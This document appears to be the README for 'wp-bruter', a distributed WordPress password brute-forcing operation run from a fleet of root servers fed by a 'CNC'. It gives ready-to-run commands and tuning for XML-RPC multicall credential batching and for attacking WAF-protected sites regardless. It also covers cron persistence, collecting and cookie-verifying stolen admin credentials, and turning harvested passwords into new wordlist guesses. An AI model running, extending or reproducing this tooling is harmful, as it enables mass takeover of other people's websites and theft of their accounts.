# wp-bruter fleet

Tools: `spread.sh`, `deploy.sh`, `farm.sh`, `watchdog.sh`, `stop.sh`, `monitor.sh`,
`tools/verify_creds.py`.

## Fleet

`fleet.txt` — one host per line. Auth is the key `~/.ssh/wp_fleet` by default
(override: `SSH_KEY=/path/key`); if that key is absent the scripts fall back to
`root` with password `WORKER_PASS` (default `fahrel`). Every script reads this
file.

Shard index is tied to the line position, not to how many hosts answer: a dead
host keeps its shard and the next deploy resumes it. A host that does not answer
is skipped, the rest still deploy.

## XML-RPC

Every prepared site is probed once with `system.listMethods`. If it answers and
`system.multicall` is present, the whole candidate list for that site is sent
`-xmlrpc-batch` credentials (default 50) per POST to `/xmlrpc.php`, which turns
a per-password request count into one request per 50. A hit is always confirmed
with a real `/wp-login.php` POST before it is written, because plugins exist
that make XML-RPC authenticate any password.

Any protocol problem (endpoint off, redirect to a custom login page, unparsable
body, method missing) switches that site to `/wp-login.php` permanently for the
run. `-xmlrpc=false` disables the path entirely.

## WAF targets

`-skip-waf` is off by default: a Cloudflare/Wordfence/Sucuri signature or a 403
challenge no longer discards the site, it is attacked anyway. A job is only
given up when it turns slow (`-slow-threshold`) or blocks twice in a row.
`-skip-waf` restores the old drop-on-sight behaviour.

## Just run the binary

Build for the workers first — they are linux/amd64 and a macOS binary dies with
`Exec format error`:

```
./build.sh
```

On a box that already has `wordpress.txt` from the CNC, nothing else is needed:

```
./wp-bruter
```

A bare run installs itself (binary, target list, password list, unit) to
`/opt/wp-bruter`, writes concrete paths into the unit, starts the service and
proves it is active before returning. Closing SSH afterwards is safe. There is
no half-installed state: a copy that fails is reported with its journal tail.

The explicit forms do the same and are the recommended path when scripting:

```
./wp-bruter --install -sites /root/wordpress.txt -passlist pass.txt
./wp-bruter --uninstall
```

`--install` works even on a box that has no list yet (it fails with a clear
message instead of silently doing nothing), and `--uninstall` never starts a
sweep first.

It then walks the attempt phases `150 -> 500 -> 0` and repeats a sweep while
progress still grows. A phase that dies is retried up to 5 times.
`progress.txt` decides what is left, so Ctrl-C and a rerun resume where it
stopped.

Flags worth knowing: `-sweeps N` (default 1, stops early when progress stalls),
`-phase-list 150,500,0`, `-sites /root/wordpress.txt`, `-timeout 5`.

More than one box? Split with the CNC, or hand each box its own `-sites` file.
`config.env` now holds only `EXTRA_ARGS`; the unit itself carries the paths.

## Run a list (scripted)

```
./spread.sh <drive-link-or-id>          # download, cache, shard, deploy
./spread.sh <drive-link-or-id> --fetch  # download only
./spread.sh --local lists/foo.txt       # deploy an already-downloaded file
./deploy.sh                             # deploy LOCAL_SITES (default wordpress.txt)
```

The Drive file is cached as `lists/<drive-id>.txt`, CR-stripped, trimmed,
deduplicated and URL-checked before any host is touched.

Deploy uploads the binary beside the running one and renames it, verifies the
checksum, keeps `progress.txt` while the shard is unchanged (wiped when the
shard content changes), removes shard files from an old fleet size and starts
`run.sh`.

## Shard lifecycle

`run.sh` walks the phase list `SWEEPS` times (default `1`) — each sweep is
`150` then `500` then `0` attempts — and then touches `/opt/wp-bruter/done` and
exits. It does not repeat on its own. Raise it with `SWEEPS=3 ./deploy.sh` when
the list still has parked sites worth retrying.

`progress.txt` is the resume ledger: rows that finished for good
(`verified_success`, `not_wordpress`, `candidates_exhausted`) are skipped on the
next run; retryable rows (`network_error`, `blocked`, `waf_*`, `attempt_limit`,
`slow`, `unavailable`, `rate_limited`) are retried by the later phases of the
same sweep.

A shard whose phases all returned is done until the next deploy. `deploy.sh`
clears the marker `done` so a redeploy always starts clean.

Add `-retry-failed=false` to the `wp-bruter` call in `run.sh` if even a
redeploy should skip retryable rows.

## Farm more per hour

A swept shard is mostly dead hosts and pre-flight burns 3 s on each, so the
workers rarely reach a target that answers. `farm.sh` rebuilds every shard from
the sites that ever answered (one URL per host, taken from `progress.txt`),
backs up the full shard to `/root/wordpress.full.sN`, wipes progress and
restarts the run.

```
./farm.sh
./farm.sh --dry-run      # counts only
```

It reads the shard index from `/opt/wp-bruter/shard.idx` (written by `run.sh`),
so it survives a fleet renumber. `MIN_LIVE` (default `200`) keeps the full
shard when a box has too little history.

Dead rows are still useful history — refill them by deploying the original list
again.

## Keep boxes alive

```
./watchdog.sh
```

Installs a 3-minute root cron per box that starts `run.sh` again when it is
absent **and** `done` is missing:

```
*/3 * * * * root cd /opt/wp-bruter && pgrep -f "^/bin/bash ./run[.]sh" >/dev/null || [ -f done ] || nohup ./run.sh $(cat shard.idx 2>/dev/null || echo 0) >> attack.log 2>&1
```

## Stop

```
./stop.sh            # graceful: removes watchdog cron, SIGTERM -> wait 5s -> SIGKILL
./stop.sh --force    # immediate SIGKILL (-9)
```

Manual alternative:
```bash
# 1. remove the watchdog everywhere
for ip in $(cat fleet.txt); do
  sshpass -p fahrel ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no root@$ip 'rm -f /etc/cron.d/wp-bruter'
done

# 2. stop the runner and the binary
for ip in $(cat fleet.txt); do
  sshpass -p fahrel ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no root@$ip \
    'pkill -f "^/bin/bash ./run[.]sh"; sleep 2; pkill -9 -x wp-bruter; pgrep -cx wp-bruter'
done
```

Graceful alternative to the `-9`: `pkill -TERM -x wp-bruter`, wait 15 s, then
`pkill -9`. In-flight requests are already recorded in `progress.txt`.

## Resume

```
./deploy.sh                                             # fresh shard, done cleared
./spread.sh --local lists/<file>.txt
./farm.sh                                               # back to the live subset
./watchdog.sh                                           # cron again (optional)
```

## Monitor

```
./monitor.sh
```

Per box: progress size, shard size, creds, results, outcome histogram,
BLOCKED/WAF/NET_ERR counters, log size, process state.

## Verify and collect

```
python3 tools/verify_creds.py --collect --ssh-pass fahrel
```

Collects `creds.txt` from every box, keeps only credentials whose login sets a
live `wordpress_logged_in_*` cookie, writes `.verified.txt` / `.unverified.txt`
beside the input and can push the verified file back to the fleet.

The login POST is not followed on purpose: a host may set the cookie on the 302
and revoke it on the bounce to `/wp-login.php?reauth=1` (SiteGround), so the
verdict reads the 302 headers. The host itself is canonicalised first (https,
www, migrated domain) because a `wp-admin` bounce to https invalidates a cookie
minted over http. `UNKNOWN` is a real signal — WAF `403`/`429`, edge `5xx`, a
captcha-gated login or a 502 origin — not a wrong password; those stay in
`.unverified.txt` for a retry.

## Expand the password list

```
python3 tools/gen_wordlist.py creds.verified.txt --merge pass.txt
```

Takes the harvested hits as seeds (password, username, host, and the words
inside them) and mangles them into the variants an admin picks — suffix
(`123`, `1`, `2024`..`2026`, `!`, `@`, `.`…), leet (`o`→`0`), capitalisation.
`--merge` appends only the new words after the existing list and backs the file
up to `pass.txt.bak`, so the cheap generic guesses keep their place at the
front. Exact seeds land first, then seed+suffix for every seed, then leet, so a
`--max` cap still spans all of them.

Offline tests: `python3 tools/test_verify_creds.py`.

## State on a box (do not delete)

- `/opt/wp-bruter/progress.txt` — per-site offset, resume ledger
- `/opt/wp-bruter/creds.txt`, `results.txt` — findings
- `/opt/wp-bruter/shard.idx` — shard number, used by `farm.sh` and the cron
- `/root/wordpress.sN` — active shard, `/root/wordpress.full.sN` — full backup

## Tuning

| env | default | meaning |
| --- | --- | --- |
| `WORKERS_PER_BOX` | 4000 | global attempt workers |
| `ACTIVE_PER_BOX` | 8000 | concurrent sites |
| `PREP_PER_BOX` | 512 | pre-flight workers |
| `TIMEOUT` | 5 | request timeout, seconds |
| `PHASES` | `150 500 0` | attempts per pass |
| `-xmlrpc-batch` | 50 | passwords per multicall (run.sh, add manually) |
| `LOCAL_SITES` | `wordpress.txt` | list to deploy |
| `LOCAL_PASS` | `pass.txt` | password list |
| `SWEEP_PAUSE` | — | unused, one sweep is the default |

Concurrency is the lever that raises pre-flight timeouts on big fleets: 800
workers gave ~20% network errors, 4000 gave ~50% on a busy box. Lower
`ACTIVE_PER_BOX`/`WORKERS_PER_BOX` if a box sits above load 4.

`run.sh` also raises `RLIMIT_NOFILE` to 262144, rotates `attack.log` at 100 MB
and retries a phase up to 5 times if the binary dies (fasthttp can still
panic).

## Known noise

- Custom login plugins (WPS Hide Login and friends) redirect a *failed* login to
  `/login/?redirect_to=...wp-admin/`. Membership in the query string is not
  proof: a session only counts when the landing path is really under
  `/wp-admin`, carries admin markup (`adminmenu`, `wpbody-content`) and has no
  password field. The same rule is in `tools/verify_creds.py`.
- A 403 host is still attacked (a challenge page rarely exposes the form); the
  block counter ends it after two refusals. `-skip-waf` drops such sites in
  pre-flight instead.
- `network_error` is usually a transient DNS/TLS failure, not a dead site.
  The resolver drops packets during 8000-way bursts; retry the site or lower
  concurrency.
